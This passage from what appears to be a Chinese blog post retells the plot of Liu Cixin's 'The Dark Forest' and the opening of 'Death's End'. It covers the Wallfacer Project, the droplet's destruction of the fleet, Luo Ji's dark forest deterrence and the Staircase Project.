<p>​        当全世界的人得知此消息后，便开始陷入了绝望，汪淼在得知整个事情的来龙去脉后，和杨冬的男友丁仪借酒消愁。两位科学家感叹着人类在三体人眼里就是虫子，还是即将灭绝的虫子，他们耍着酒疯大喊道，末日万岁，虫子王万岁，智子万岁。史强看到后为了给他们大气，让他们振作，把俩人带到了一片麦地，他们注视着麦田，蝗虫在这片麦地漫天飞舞，像沙尘暴啃食着庄稼，两人看到这一幕心有所想，人类与蝗虫科技之间的差距，比人类和三体人之间大多了。我们用飞机喷洒各种杀虫剂，培育他们的天敌，无所不用其极地想消灭他们，但他们翱翔于天地之间，没有被灭绝。把人类看成虫子的三体，似乎忘记了一个事实，虫子虽然很弱小，但从来没有被真正消灭过，三人沐浴在这生命的暴雨中，感受着地球生命的尊严。汪淼和丁仪把手中拎这的酒慢慢洒在脚下，他们说，这，是敬虫子的。</p>
<h3 id="黑暗森林"><a href="#黑暗森林" class="headerlink" title="黑暗森林"></a>黑暗森林</h3><p>​        书的开篇借用一只褐蚁，在叶文洁女儿杨冬的墓碑上爬行，引出了一段往事。上本书的主角叶文洁和新主角罗辑，在叶文洁的女儿杨冬墓前见面，新主角罗辑是杨冬的高中同学，很聪明，但胸无大志，以前是搞天文学的，犹豫不好混现在改行教社会学。叶文洁给出了一条建议，让他把这两个专业结合，做出，宇宙社会学。并给出了两条宇宙社会学的公理：第一，生存是文明的第一需要；第二，文明不断增长和扩张，但宇宙的物质总量保持不变。和两个重要概念，猜疑链和技术爆炸。说完这些，叶文洁便匆匆的离开了。离别时自言自语道，我尽了责任。</p>
<p>​        时光荏苒，多年过后，人类已经知道三体在400年后即将降临，世界各国政府进入了备战状态，准备齐心合力保卫家园。由此开始了，危机纪元。世界上正发生着这几件大事，第一件，规划组件太空军。在这支太空军里，有一位主角，章北海，他是军人世家。在外人眼里，他坚信人类必胜，收到组织高度重视。后来太空军选出了一批信仰坚定的军人冬眠，去增援末日之战，其中就包括他。第二件，全球技术公有化，联合国逐渐成为世界政府，国家的边界开始模糊，地球上出现了逃亡主义，他们认为，地球科技已被锁死，走出太阳系，寻找新家园才能延续下去。但毕竟资源有限，大多数人要留在地球上。不久之后，人人平等的口号响彻地球，联合国一致决定，要死一起死，坚决反对逃亡主义。一时间，保卫家园，绝不逃离，成为了世界的主旋路以及政治正确。</p>
<p>​        画面一转，罗辑这位花花公子，和一位女伴刚从宾馆出来，突然一辆疾驰的车向他们撞来，恰好被消防栓绊倒的罗辑，侥幸逃过一劫。但女伴却被当场撞死。罗辑以为这是意外，他不知道这是三体人给地球叛军下达的暗杀命令。不明真相的罗辑被警务人员带进了一个地下十层的小房子里，在这，他与上本书中的史强相识了。随后，罗辑被大批武装部队护送上了飞机，在多架歼击机的护航以及数名保镖的护送下，罗辑安全抵达了联合国会场，这突如其来的大场面，换在谁身上都得蒙圈。大会上联合国秘书长，宣布了面壁者计划。面壁计划是基于这两个主要情报产生的：一、地球在三体人那已经完全透明了，任何交流、会议都变成了现场直播；二、三体人的弱点在于不懂说谎，在他们的世界里没有阴谋、暗算这些词。面壁计划的核心在于，选出四个战略计划的制定者和领导者，他们完全按照自己的思维制定计划，不与外界交流，计划真正的目的和意图都藏于他们的大脑。他们所表现出来的行为应该是欺骗敌人。这四人被称之为，面壁人。面壁人拥有最高权力去调集地球资源，简而言之就是在世界上选出四个有能力的大骗子，去骗三体人。</p>
<p>​        秘书长公布了面壁者名单。第一位面壁者是刚刚卸任的美国国防部部长，泰勒；第二位是委内瑞拉现任总统，雷迪亚兹；第三位是世界知名脑科学家，希恩斯；第四位是，罗辑。罗辑听到自己名字后差点晕过去。各国领导人，和世界知名人物，齐刷刷地盯着他。罗辑被搀扶到了主席台上。大脑一片空白的罗辑在散会后才回过神，他认为这是搞错了，不断地向所有人拒绝自己面壁人的身份。而所有人都以为，他，已经开始演戏了。</p>
<p>​        当他一人冲出大会后，又遭到了暗杀，被狙击手一枪撂倒。好在他一路上都穿着防弹衣，这之后罗辑一直被保护着，慢慢地，罗辑也想通了。既然自己没法辞职，不如利用特权好好享受人。正当其他面壁者殚精竭虑，绞尽脑汁，准备大干一场时，罗辑的要求在联合国眼里非常奇特， 他先要了个依山傍水，被自然拥抱的山庄，去那开始享受社会文雅的贵族生活。随后，他只要说一句，这是面壁者计划的一部分，他所有花花公子的欲望都会被满足。而事实上，那些世界领导人觉得，罗辑干得很好，不仅让人捉摸不透，还比其他三位花钱少。</p>
<p>​        三体人通过智子，从残余的地球叛军中，选中了三个人，去破解面壁人的计划。这三位被称之为，破壁人。罗辑没有破壁人，因为三体人知道，只要罗辑他自己想不明白，他就是自己的破壁人。其他的三位面壁人，有人在研究核弹，有的在研究军队，有的在研究脑科学。而罗辑在干嘛呢？他在泡妞。</p>
<p>​        他把史强找来，让史强去安装自己的描述，找到他梦中的女神，史强很快找到这个人，她的名字叫，庄颜。是中央美院国画系刚毕业的大学生，史强很简单的就把她忽悠来了，她对庄颜说，世界需要你，面壁者需要你。当罗辑看见自己梦中的女神，活生生地站在面前时，整个人都傻了，他对庄颜说，你的工作是，使自己快乐，成为世界上最幸福最快乐的女孩。这是面壁计划的一部分。</p>
<p>​        不久后，罗辑带着庄颜，去了他最想去的卢浮宫。在蒙娜丽莎的微笑面前，两人坠入爱河，这位纯洁的小女生，成为了罗辑的妻子，从此开始了幸福的生活。史强在之前抓捕地球叛军的行动中，收到了辐射影响身患白血病，现代的医疗手段无能为力，在完成罗辑交代的这个任务后，他进入了冬眠。希望未来的医疗水平能救他一命。</p>
<p>​        五年后，第一个被破壁的面壁人是前美国国防部长，泰勒。破壁人以粉丝的身份走入他的家中，揭穿了他的目的。说道，你表面上是想建立一支太空神风敢死队，跟三体人死磕。其实，你的这批部队，会装备一种叫球状闪电的武器，被它打死的人会变成幽灵态，在开展前夕，你会让他们去偷袭地球军队，把自己人打成量子态的幽灵部队，让他们去死磕三体人，在破壁人揭穿泰勒的计谋后，来了一句神补刀。即便您成功了，主也不在乎。</p>
<p>​        破壁人将自己的成果发到网上，随后舆论哗然，大家接受不了泰勒杀死自己的人的计划，失落的泰勒，在罗辑别墅的周围，饮弹自尽。</p>
<p>​        从此人们对面壁者产生了越来越多的质疑，罗辑的好日子也到头了。世界政府秘密地将他的妻子和孩子冬眠送到未来，强迫罗辑做点什么，毕竟他是三体人唯一要暗杀的人类。苦思冥想的罗辑，走在已经被冻结的湖面上。哗啦一声，冰面裂开，罗辑掉入了湖里，在漆黑冰冷的湖水里，他终于明白当初叶文洁对他说的那番话是什么意思了。好在罗辑身体素质还行，不然差点就淹死了。 </p>
<p>​        悟出真想的罗辑，赶紧动用特权，把他护送到一个及其安全的地下室，在这里，罗辑通过自己的权利，向宇宙发射了一个恒星的坐标，这件事被后人戏称为，逻辑的咒语。由于咒语很久后才能生效，所以罗辑告诉医务人员，把他送去冬眠，等那颗恒星爆炸后，再唤醒他。但很快，他就在一次遭到了暗杀，这一次使用的是基因武器，针对目标进行病毒感染，现在的医疗手段对它毫无抵抗能力，罗辑立刻被医疗人员强行冬眠，希望在未来，能有医疗手段治疗他。</p>
<p>​        八年后，面壁者雷迪亚兹和希恩斯从冬眠中被唤醒，他们被告知，技术已经成熟到他们的预期了，脑科学家希恩斯得到超级计算机。不久之后，他和妻子造出了思想钢印，思想钢印可以在人脑中输入任何信息，并让这个人坚信不疑。比如，在受印者脑中输入水是有毒的，渐渐地他就再也不敢喝水了，这台机器的主要用途在于给人类太空军的思维打上人类必胜的信念。</p>
<p>​        核弹狂人雷迪亚兹得到了3.5亿吨的恒行型氢弹，紧随其后的是，他的破壁人出现，破壁人说道，你想造一百万可恒星氢弹放在水星上，主要的目的不是防御地球，而是为了引爆水星。把水星推进太阳里，从而让地球，火星，金星脱离轨道坠入太阳，与抵达的三体人同归于尽，毁灭三体人想得到的东西。这位破壁人在最后同样来了一句神补刀，你的计划，主不在乎。因为以地球的资源，根本造不出一百万颗恒星氢弹，即便造出来了，以远远不够把水星炸到脱离轨道。</p>
<p>​        破壁人先前也把资料上传到网上，舆论再次哗然，大家接受不了这种疯狂的举动。在之后的听证会上，雷迪亚兹的面壁者身份被终止，在准备抓捕雷迪亚兹时，他撒谎说自己的手环上是摇篮系统， 只要自己有生命危险，手环上的信号就会中断，从而引爆纽约市的氢弹，如果纽约市的氢弹被触碰也会爆炸，雷迪亚兹成功逃脱，在回国的路上，大家才知道这个摇篮系统不过是他为了脱身的幌子。</p>
<p>​        回国后，这位以往被国民认为是大英雄的前总统 并没有迎来鲜花和掌声，而是无数的石头，雷迪亚兹当场被无数的石头，砸死。</p>
<p>​        一百八十五年后，罗辑从冬眠中被叫醒，他发现周围的人充满自信，在这个时代，人们的基因渐渐进化，到处都是帅哥美女，人类掌握了两个技术，可控核聚变，这项技术的出现，彻底解决了人类的能源问题，石油能源被淘汰了。在这个时代已经没有省电省水的概念了，所有的电器都不再使用电池。另一项是，基因改造技术，彻底解决了粮食问题。</p>
<p>​        现在人们造出了两千艘太空战舰，飞船能达到光速的百分之十五，比三体人的飞船快多了。面壁计划很早就被废止了，罗辑当年向太空发送的咒语，被当成了笑话。为了准备与三体人作战，人们在一千米以下建立了城市，大多数人生活在地下，少部分人生活在地面上，主流语言变成了英语一汉语的杂糅语言，希望三体人占领地球的叛军组织，早在一个世纪前就被消灭了。之前人类经历的大低谷，那时候世界格局紧张异常，人人都处在备战状态，低落的情绪下，人们自暴自弃，经济开始大滑坡，环境开始恶化，全世界都发生了饥荒。人吃人成了常态，人口急剧下降，后来越来越多人逐渐想明白，既然灾难一定要来临，痛苦的一天也是一天，开心的一天也是一天，于是他们站出来引导大家，振臂高呼，给岁月以文明，而不是给文明以岁月。</p>
<p>​        随即人类的复兴运动兴起，文明加速进步，罗辑从冬眠中恢复了不少后，参加了最后一次面壁者远程听证会。在会上，他看到了已经苏醒的希恩斯和他的妻子助手，听证会像他们宣布了，面壁者计划被终止，所有面壁者恢复普通人的身份，希恩斯的亲子在大会上，对丈夫说道，我是你的破壁人。你所制造的思想钢印，给每个人打上的思想前面都加了负号，也就是说这些人，坚信的是人类必败，你是想培养出一批逃亡主义者，逃出地球。</p>
<p>​        会上的人无不惊讶，太空军开始调查这批被打上人类必败信仰的钢印族，散会后不久，这位面壁者的妻子，就切腹自尽了。而面壁者希恩斯并没有得到制裁。会后，罗辑碰上了老朋友史强，没多久，罗辑就再次遭到了暗杀，第一次差点被无人汽车撞死，第二次差点坠落身亡，第三次差点被机器人服务员捅死，第四次差点被毒死，第五次差点被只能沙发勒死，这次暗杀他的，是叫做killer的暗杀病毒，好在一向警觉敏锐的史强在他身边救了他。随后，他们为了躲避电脑追杀，离开了地下城市，去了地表。</p>
<p>​        另一边的增援未来的指挥官们被唤醒，由于钢印族隐藏得很深，所以这批被唤醒的军官，被任命为执行舰长，其中就包括章北海。章北海登上了自然选择号，舰长是一位漂亮的女生，名叫东方延续，他给了章北海一把手枪，说，如果发现我有失败注意的想法，可用它杀了我。结果指挥权的章北海立刻做出了让所有人都意料不到的举动，它通过各种指令，劫持自然选择号上的2000名船员，跑路了。</p>
<p>​        其实他一直都是一名伪装很好的失败主义者，他坚信人类必败，舰队司令部的司令们都懵了，这是什么状况？司令官们反映了半天才回过神来派出追击舰队。另一边，世界政府开始商讨如何安置即将被人类打败的三体人。与此同时，人类观测到，三体舰队派出了一个小型探测器，已经进入了太阳系。国际舰队决定，派出全部两千零十五艘恒星级战舰，拦截三体探测器，以显示地球的雄威。</p>
<p>​        此时地球上所有的媒体都在直播这一盛况，几乎所有人都激动地守在屏目前，有的发出兴奋的尖叫，有的感动得嚎啕大哭，无人不为自己文明而自豪，各地开始了接连不断的狂欢，舰队紧密的排成了100X20的长方形矩阵，一起去迎接。83岁的丁仪已经是这个时代最德高望重的科学家了，他被选中作为第一个接触三体小型探测器的人。先头飞船捕获了这枚探测器，这枚探测器外表像极了一滴水，它的表明光滑无比，如同明镜。于是人们给了她一个称呼，水滴。</p>
<p>​        谨慎的丁仪在接触水滴前，令他所在的量子号飞船，随时准备以最高速度跑路，同时临近的青铜时代号已经入了准备状态。水滴被成功捕获，这一画面传到了地球。几乎所有的人都在欢呼雀跃，热泪盈眶。丁仪博士上千仔细观看，他发现水滴的表面及其光滑，当他用显微镜看水滴表面时，他吓坏了。无论是放大一百倍，还是一千倍，一万倍，一百万倍，一千万倍。水滴的表面还是光滑无比，像镜面一样。这意味着，改物体密度极其的大，无比的坚硬，它可以轻易的横穿地球，且不会有丝毫损伤，就像子弹穿过奶酪。人们现在所能造出最光滑的东西，放大个几百倍，就可以看到粗糙的像重重山峰的纹理。惊讶无比的丁仪博士缓缓回过神来，自言自语道，毁灭你，与你何干。随后丁仪大喊一声，傻孩子们快逃啊。但一切都太晚了。</p>
<p>​        水滴干扰了信号，随后尾巴开始出现蓝色的光环，不断加速，捕获他的飞船瞬间汽化，随后它以全速精准地撞向，第一排第一列第一艘战舰的燃料舱。由于这些战舰用的都是核聚变燃料，燃料舱一炸就直接玩完，可见三体人对人类战舰的弱点了如指掌。它向石子划过空气一样穿过一艘又一艘战舰，整整齐齐的战舰像鞭炮一样，在太空中不断炸开了花。水滴仅仅用了1分28秒就贯穿了第一队列的一百艘战舰。由于水滴太小，人们对雷达根本检测不到，后排的舰队完全不知道怎么回事，就看见这眼前焰火表演。</p>
<p>​        水滴此时做出了一个不可思议的锐角急转，丝毫没有减速的撞向第二队列的飞船，后来科学家看到这段影像，都傻了。水滴的攻击方式，非常的原始，就是用头撞。当第三排战舰也炸完后，舰队开始散开准备逃跑。虽然他们不知道怎么了，但这样炸下去，不得不跑。</p>
<p>​        在散开的过程中虽然有战舰发现了水滴，并进行反击，但炮弹打到水滴上，丝毫没有反应。只是让他稍微减速了一下。水滴就像一枚死神的绣花针，以最短的路程，来回穿梭在战舰之间。正常战舰只有五十分钟，人类所有的骄傲与荣光。就被一枚小小的探测器，顷刻覆灭。</p>
<p>​        毁灭你，与你何干。这个故事可以看出，两个科技间存在巨大差距的文明，是不可能打的有来有往的。</p>
<p>​        这场战斗，只有两艘战舰逃离了战场，他们分别是青铜号和量子号。与他们不同方向的正在逃亡的自然选择号，以及追击它的四艘战舰。蓝色空间号，企业号，深空号，终极规律号，也幸存了下来。</p>
<p>​        章北海成为了这五艘战舰公认的英雄，如果他也是面壁者的话，他会是一名成功的面壁者。这无五艘战舰开始前往寻找新家园，但他们发现，最近的太阳系，以现在的速度航行，也要两千年。五艘战舰的燃料，配件，补给，只够一艘飞船达到目的地。所有人都渐渐明白这个残酷的事实，不是你死，就是我活。随着时间的推移。五艘战舰开始了彼此间的互相猜疑，都担心对方会首先发动攻击。终于，章北海下定决定要使用次声波氢弹首先发动攻击，这种攻击不会对船体造成伤害，只会消灭船内所有生命。但就当他要摁下发射键的时候，自然选择号首先遭遇了次声波氢弹袭击。在听到预警袭击的警报时，章北海放弃了发射，意味深长的说了一句，没关系，都一样。</p>
<p>​        瞬间，自然选择号全体船员，在次声波氢弹的袭击下，集体阵亡。发起首攻的是终极规律号战舰，他向其他的战舰也发出了次声波氢弹，但终极规律号并没有成为幸存儿，早就准备好的蓝色空间好抽干了船内的空气，没有空气，次声波就不会有任何作用。蓝色空间号随机反击，用全部武器集火终极规律号，终极规律号被彻底摧毁。随后，蓝色空间好开始打扫战场，他们拿走了所有能带的东西，飞向了远方。他们承载的人类的全部思想和记忆，怀抱着地球所有的荣光与梦想，默默地消失在永恒的夜色中。</p>
<p>​        再来看看地球这边，正所谓物极必反，乐极生悲。之前还手舞足蹈欢呼庆祝的人们，当亲眼看见战舰像鞭炮一样炸没时，瞬间全部崩溃，地球人开始陷入绝望，自杀的人络绎不绝。绝大多数人通过肆无忌惮的纵欲来麻痹自己。绝望充斥着这个世界。水滴飞向了太阳，并不断对太阳发出强烈的干扰信号，从此人类再也无法通过太阳作为放大天线，向宇宙发出任何信号。</p>
<p>​        罗辑这边，当他和史强从外面回到家时，发现成千上万的人在等他，人们都把他奉为救世主，全部跪在罗辑面前。他们说，主啊，救救我们吧。原来罗辑之前发出的咒语生效了，那颗指定的恒星被一颗光粒穿过，爆炸了。</p>
<p>​        现在所有人都相信罗辑是某种神，罗辑被恢复了面壁者身份，成为了地球上唯一的面壁者，同时也成为了人类唯一的信仰。现在无论他说什么，人们都会照办。罗辑立刻提了两条要求，第一、所有城市恢复秩序；第二、所有人都回家吧，让我静静。人群散尽后，逻辑给惊讶不已的史强解释了为什么咒语会生效，他提出了黑暗森林法则。</p>
<p>​        首先，宇宙的总量是恒定的，但宇宙中有无数的外星生命都在以指数增长。所以宇宙是一个生存死局。不是你死，就是我亡。在这种严格竞争下，一方的收益必然意味着另一方的损失，双方不存在合作的可能。也就是说，自己文明的未来，就是建立在他人文明的痛苦之上，只有损人利己才能活下去。其结果就是，一方吃掉另一方，所以每个文明都必须为了生存而战。再弱小的文明都有可能技术爆炸，从人类文明来看，我们从猿猴到现在，从宇宙的尺度，就是一瞬间的事，这就导致文明之间，随着时间推移会不断出现猜疑，大家脑子里都在想，他会不会来干掉我，抢我资源，这种不断形成的猜疑链。停止的方法，只有一方死了才会结束。所以为了避免其他文明技术爆炸，在以后跟自己争夺资源。最安全的方法就是发现一个文明后，能消灭的就直接消灭，打不过的就绕着走。</p>
<p>​        罗辑把宇宙比喻成一走黑暗森林，每个文明都是带枪的猎人，像幽灵一般前行在林间，每个猎人都必须小心，因为只要暴露自己的位置，就会被其他文明干掉，毕竟这是保证自己安全最好的手段。</p>
<p>​        我相信玩过吃鸡的人都明白这种感受，想要活下去就得干掉其他人。</p>
<p>​        罗辑之前的咒语，就像是在森林中的某棵树上做了标记，那么其他的猎手最安全的行为，就是悄悄毁掉那片区域。毕竟对于高级文明来说，攻击是最节省成本的。但现在罗辑再也发不出咒语了，因为水滴封锁了太阳信号。其实早在幸存舰队之间的黑暗战役传回地球后，罗辑就已经确信，黑暗森林法则是没有问题的。罗辑只让史强明白了真相，并让他保密.他现在无计可施，渐渐地，罗辑开始借酒消愁，闭门不出，像个流浪汉一样在街上游荡.后来政府机构强迫罗辑随便干点什么以增加人民的信仰，给了罗辑雪地项目。</p>
<p>​        这个项目是通过恒星氢弹，和海王星的油膜物质制造太空尘埃，以便在其余九个水滴到达地球前，可以提前观测到。这个计划显然是没事找事，毕竟观测的唯一作用便是，知道其余水滴什么时候到地球，罗辑无奈之下开始负责这个项目。随着工作的进展，逻辑把全部身心都投入到了雪地工程，把这当成一种逃避手段.但他越投入，人们就越失望。大家逐渐看清，罗辑的行为是在逃避，这是一个希望和失望来的一样快的时代。公众对罗辑失去了信心。很多人都开始怀疑罗辑的咒语，不过是一次巧合。罗辑从人们心中的神，变成了普通人，又变成了大骗子。他面壁者的实际权力也没有了。雪地工程也不得不停止。</p>
<p>​        在一个秋雨连绵的下午，罗辑被逐出自己生活多年的小区。他穿着很脏的外套，拿着铁锹，走到了最初和叶文洁对话的那片墓地。他在叶文洁墓旁开始给自己掘墓，最后精疲力尽的他，趟进坑中回想起自己的一生，他知道，是时候了。他虚弱的拿起手枪，对着空气高喊。我，要和三体人对话。随后露出了手腕上的手表，这是一个检测我生命体征的摇篮系统，只要我死了，学弟工程上的三千六百一十四颗氢弹就会爆炸，由此形成无比巨大的油膜，将会通过太阳反射出三张无比简单的突然，这三张图就是三体星球的坐标。宇宙中其他的文明将会知道你们的存在。他说，30秒后我将对自己的心脏开枪，虽然我知道三体星球暴露后，地球也会随之暴露，但我，只能这样做。</p>
<p>​        短短几秒，一直无处不在的智子在罗辑面前展开成三个球，上面写着，住手。三体人通过智子又说，你把枪放下，咱们好好谈。随后罗辑提出的几个条件三体人都照办了。第一、水滴飞离太阳系；第二、三体飞船离开来太阳系的轨道。</p>
<p>​        罗辑胜利了，他完成了面壁者的使命，他虚弱得差点晕过去，智子不断地关心罗辑的身体状况，生怕摇篮系统终止。摇篮系统是非常严谨的，如果水滴试图去触碰雪地工程上的氢弹，也会引发爆炸。他很幸运，如果不是三体人因为猜疑，消灭了人类叛军，罗辑早就死了。</p>
<p>​        五年后。罗辑和他的妻女来到了三体人帮地球人建造的引力波天线附近玩耍，这种天线不需要通过太阳，直接就可以像宇宙发射信号，正在玩耍的一家人，突然看见智子在他们面前展开，与他对话的是当年警告人类不要回复的监听员1379。他与逻辑相互表达敬意。临近晚霞，1379说，太阳快落下去了，你们的孩子居然不害怕。罗辑回答道，当然不害怕，她知道，明天的太阳还会升起来。</p>
<p>​        从叶文洁开头和罗辑的对话可以看出，这个把人类坑死的女人，在那时貌似开始有了一丝愧疚。社会中一时兴起的逃亡主义，由于只有少部分人可以逃走，所以被大部分人禁止了。在此时，人人向往的公平，反而成为了人类生存的障碍。在智子的监视下，人类变得毫无隐私，人们为了欺骗三体人，制定了面壁者计划，选出四位大骗子作为面壁者去骗三体人，其中三位面壁者都是世界知名人物，看似志在必得，信心满满，但都被一一击败，而罗辑却成为了真正的救世主。人类从绝望的大低谷时代觉醒，进入了信心满满的新时代，却又在末日之战中再次陷入了绝望，这里好像是在说，人总是好了伤疤忘了疼。从幸存的那几艘飞船之间的战斗，再到宇宙的黑暗森林法则可以看出，竞争是残酷的。宇宙是一个生死局，不是你死就是我活。从逃亡主义，到泰勒和雷迪亚兹要以杀死自己人为代价，去威慑三体人；再到罗辑怕公众知道黑暗森林法则后大家反对自己的计划所以不敢公布，这些或许想告诉我们，大多数人都是自私的，整个故事无论是叶文洁的悔悟，还是罗辑的成长，又或是人类从痛苦的反省，这些都仿佛在告诉我们，痛苦是成长的催化剂。</p>
<h3 id="死神永生-上"><a href="#死神永生-上" class="headerlink" title="死神永生 上"></a>死神永生 上</h3><p>​        这个故事要从一个叫云天明的人开始说起。在以前的危机纪元4年，那个时候的人们心情很复杂，外星人400年后会来侵略地球这个消息，在那会可是一个既新鲜又可怕又劲爆的消息，各个媒体都在铺天盖地的报道这件事情。不过在云天明眼里，什么三体人四百年后会侵略地球，那都不是事儿，因为以他的病情，明年的事都不用他操心了。他的身边没有几个亲戚，其中他的姐姐还总想让他早点安乐死，那时候，治疗绝症就是个花钱的无底洞，对于拖家带口还没买房子的姐姐来说，弟弟云天明早点死她还能从父亲那拿到不少遗产。云天明也很识趣，也不想受罪。想着，就这两天准备安乐死吧。</p>
<p>​        就在他想着安乐死的这件事儿的时候，云天明的同学胡文，带着创业成功的喜悦找到了云天明。胡文的公司主要是卖饮料的，胡文能来找云天明并不是他们之间关系有多好，而是胡文卖饮料能成功，是因为，云天明的一个点子。这个点子来自于云天明对饮料独特的爱好，这个爱好就是，在矿泉水里塞野草喝。胡文当场给了云天明三百万，这笔钱对云天明来说可有可无，云天明本想拒绝，但胡文非常坚持，无奈之下云天明才收下了这笔巨款。没多久，云天明还是决定安乐死，他的病已经重到五福享受这300万了。这笔巨款他并不打算留给姐姐，毕竟云天明已经如姐姐所愿，赶紧去阎王爷那报道了。此时，他突然灵光一闪，云天明决定用这笔钱，给他大学里暗恋的程心送一颗星星，一颗真正的星星。</p>
<p>​        那去哪买一颗星星呢？这是联合股展开了一项群星计划，主要的目的，是骗钱。。。对外叫筹款。他们拍卖太阳系外的部分恒星所有权，买到了，则会得到一张纸，上面标明你的合法所有权。晚上的时候你就可以望着这颗星星，心理暗爽，哈哈，这颗星星是我的了。然后就没什么乱用了。如果你想去那里，不好意思，不可能。最近的恒星都有一百多光年的距离，所以这个计划，开始时就结束了，总共也没卖出去多少颗。不过有没有用对于云天明现在来说已经不重要了，他从胡文那要到了程心得个人资料，花了三百万，匿名买了一颗恒星送给程心。不禁感叹，云天明真是个浪漫的人啊。第二天，云天明开始接受安乐死。正当他要摁下最后的确认按钮时，程心带着人突然出现。程心对他说出的第一句话非常出乎意料，天明，你知道么，安乐死法是为你通过的。 </p>
<p>​        这话就要从阶梯计划说起来，当时程心在情报局工作，局长叫维德，是一位雷厉风行的关键人物，他有一句广为人知的口号：前进，前进，不择手段的前进。维德想发射一枚速度达到百分之一光速的探测器，去获得三体舰队的情报，在这时，造一枚百分之一光速的探测器是不大现实的。但程心提出了一个设想，造出一枚只有辐射帆的小型探测器，并在辐射帆的航行轨道布置核弹，每一次核弹爆炸都会使飞船加速，这个过程，很像在攀登阶梯，该计划，被命名为阶梯计划。这个计划的负责人，正式程心，这枚探测器必须非常的轻，由于技术的限制，导致探测器小到只能放入一个被急冻的人脑，阶梯计划真是没有办法的办法，大家只能选择相信三体人有能力把一颗人脑还原成一个人，并且他们愿意去这么做。这种行为无异于赌博，且失败率很高，但只要成功，只要有一个人能进入三体舰队的内部，就会引起无限的可能性。程心在执行这一计划时，得知有人匿名送给了自己一颗星星，这对他来说是一个巨大的惊喜。此刻的她陷入了从未有过的幸福感。</p>
<p>​        阶梯计划正在紧锣密鼓的进行着。但用谁的大脑成了问题，在社会道德的压力下，这个人只能从身患绝症并且愿意安乐死的人中选，而且这个人的资历要够也愿意这么做。程心在一次和同学的聊天中，得知以前的同学云天明，身患绝症早已时日无多，程心没有多想，便把它纳入了人选之中，随后便有了程心阻止云天明安乐死的那一幕。</p>
<p>​        云天明得知了这来龙去脉后，接受了女神的请求，加入了阶梯计划。当云天明的大脑被取出后，程心才得知那颗星星正式云天明送的，此时她突然意识到自己做了什么。因为等待云天明的可能是无尽噩梦。假如三体人真的捕获了云天明的大脑。反复虐待也不是没有可能。阶梯计划开始了， 但百密终有一疏，探测器偏离了航线，飞向了无尽的深空。情报局的领导们选中程心冬眠，到未来继续跟进阶梯计划。希望能有奇迹发生。</p>
<p>​        罗辑利用黑暗森林法则拯救了地球后，人们从此进入了威慑纪元。三体人在这个年代，看似跟人类是你好我好大家好。人们感觉，三体人解除了对地球的科技封锁，并细致入微不厌其烦的传授科学。有时自己还被三体人嫌弃学得慢，被催着快点学。人们觉得，自己一下子获得了被压抑几个世纪的知识。</p>
<p>​        三体人还帮助人类建造了引力波天线，和引力波飞船，万有引力号。来帮助人类利用这些工具威慑自己。人们需要建造引力波发射装置，是因为用引力波向宇宙发射信息，比人类之前用的任何手段都靠谱有效。当初人类舰队被水滴团灭，在战场上，只有量子号和青铜时代号，这两艘战舰成功逃离，由于资源有限，青铜时代号突袭了量子号。带着量子号的物资飞往了另一边，经过漫长的一段时间，青铜时代号返航了，现在飞船上的人可以用肉眼看到地球了。他们激动地喊着，回家了，回家了！他们幻想着回到地球上安逸的生活，和被人崇拜的感觉。</p>
<p>​        之前，他们收到了一条消息，被告知，人类对三体世界的威慑，已经成功建立，让他们尽快返航。一开始没人信，后来智子在青铜时代号上展开，并建立了通信，这时青铜时代号上的人才信了。并且他们得知，自己已经成为了人们的英雄，全世界的人们都在盼望着他们回归，青铜时代号的人回到太空港后，战舰上的人，看到人山人海，都在为他们忘情的欢呼着。当青铜时代号上所有人都离舰后，突然一片寂静，迎接他们的人当中有一位上校，开口说了一番话，大致内容如下：你们已被开除了军籍，你们带来的耻辱，永远无法被抹灭，你们的亲人不想见到你们呢，他们以你们为耻，他们恨你们，你们将被移交到司法系统。</p>
<p>​        说完后，大批武装部队出现，逮捕了他们。罪名是一级谋杀和反人类罪。在审判中大家才知道，在当时没有退路的太空里，青铜时代号的人们建立了集权社会，为了集体生存，几乎每个人都放弃了自我，成为了集体的一部分。青铜时代号准备对另一艘战舰发起进攻时，曾有一次投票，舰上94%赞成攻击。当用次声波氢弹解决了量子号后，人们把上面的尸体全部补充进了食品库存，成了船员的食物。</p>
<p>​        最后审判的结果是，138人无罪，6名高级军官终身监禁，其余的人均被判刑。刑期从二十年至三百年不等。在他们进监狱前，有几位青铜时代号上的军官，被宪兵押送着最后一次进入了他们的战舰，进行一些交接工作。其中有一位被押送的军官，史耐德，他在交接完成时，突然进入另一件操作室，快速调出一个通信界面，他说道，青铜时代呼叫蓝色空间！青铜时代呼叫蓝色空间！就在此刻，一束激光穿过他们的胸膛，他用尽最后的生命喊出一句话：不要返航！这里不是家！</p>
<p>​        本来蓝色空间好还在犹豫中，当收到这个警报时，它立刻全功率加速，能飞多远飞多远。不久后万有引力号飞船开始追击逃跑的蓝色空间号，为什么要追呢？因为当人类得知黑暗森立法则后，特别害怕被其他外星文明发现，所以，追击蓝色空间号并将其摧毁，成为了万有引力号当前的首要任务。三体人派出了两个水滴去协助万有引力号。</p>
<p>​        人类文明从三体人那学到了越来越多的东西，而三体人也从人类璀璨的文化中学到了不少。当人们知道，三体人喜欢地球文化时，一开始是不相信的，后来三体人给人们看了很多，自己模仿人类文化的艺术作品，包括电影、小说、绘画等，这些作品，都是用人类作为角色，环境也都是地区上的。这时人们才相信。人们用AI和仿生技术，帮智子造了一个身体，智子成为了有躯体的机器人，摇身一变成为了一位魅力庄重的日本女人。</p>
<p>​        威慑纪元六十一年，程心从冬眠中被唤醒，但并不是因为阶梯计划，而是因为云天明从给他的星星。这颗恒星被发现周围还有两个行星，其中一个与地球十分相似。发现这些的是一名叫艾AA的女博士，一位像鸟儿一样轻灵的女孩子。他后来成为了程心得好友和得力助手。</p>
<p>​        由于现在人们已经具备了星际远航的能力，所以这个消息一出，这颗恒星的价格马上开始飞升。联合国唤醒程心就是为了买下这颗星星。程心因为这个星星开始小有名气。刚来到新世界的程心，自然是很不适应，就像是刘姥姥进大观园一样，看啥都新鲜。在这个和平盛世的年代，男性们都趋于女性化，到处都是精致的女装大佬，程心一开始走在大街上，还以为男人都灭绝了。她不禁感叹，这个时代太温柔了。</p>
<p>​        一天，诚信接到AA的邀请，去一个地方。程心到了后并没有找到AA，等待她的是之前自己的上司，维德冷静的向程心连开两枪，维德告诉他，我与你并没有私人恩怨，只是我需要成为执剑人，而你会阻止我。我必须不择手段的前进。</p>
